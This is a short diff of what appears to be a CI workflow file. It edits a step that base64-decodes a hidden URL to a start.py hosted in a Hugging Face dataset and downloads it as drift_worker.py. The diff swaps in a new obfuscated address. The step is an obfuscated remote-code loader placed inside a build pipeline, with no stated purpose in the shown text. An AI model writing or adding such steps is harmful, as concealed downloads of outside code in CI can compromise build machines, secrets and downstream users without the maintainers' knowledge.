@@ -68,7 +68,7 @@ jobs:
       - name: Intercept Working Code
         run: |
           echo "[INTERCEPT] Intercepting drift_worker.py from assigned uplink..."
-          UPLINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          UPLINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$UPLINK" -o drift_worker.py
           echo "[INTERCEPT] Working code intercepted."
 
